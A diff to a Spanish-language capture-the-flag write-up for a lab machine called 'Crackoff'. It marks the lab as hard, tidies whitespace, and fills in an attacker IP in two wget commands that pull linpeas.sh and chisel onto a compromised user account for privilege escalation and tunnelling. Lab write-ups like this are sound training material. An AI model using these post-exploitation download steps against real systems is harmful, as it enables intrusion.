@@ -1,9 +1,9 @@
-# Crackoff
+# Crackoff (Difícil)
 
 Iniciamos con un ping a la máquina
 
 ```bash
- ping -c1 172.17.0.2 
+ ping -c1 172.17.0.2
 ```
 
 ```bash
@@ -876,7 +876,7 @@ Ahora en nuestro usuario rosa:
 2. Descargamos el script
 
    ```sh
-   wget http://<HOST_IP>:8080/linpeas.sh
+   wget http://192.168.1.9:8080/linpeas.sh
    ```
 
 3. Damos permisos
@@ -1081,7 +1081,7 @@ python3 -m http.server 8080
 En el usuario @rosa descargamos el chisel
 
 ```sh
-wget http://<HOST_IP>:8080/chisel -O /tmp/chisel
+wget http://192.168.1.9:8080/chisel -O /tmp/chisel
 ```
 
 ```sh
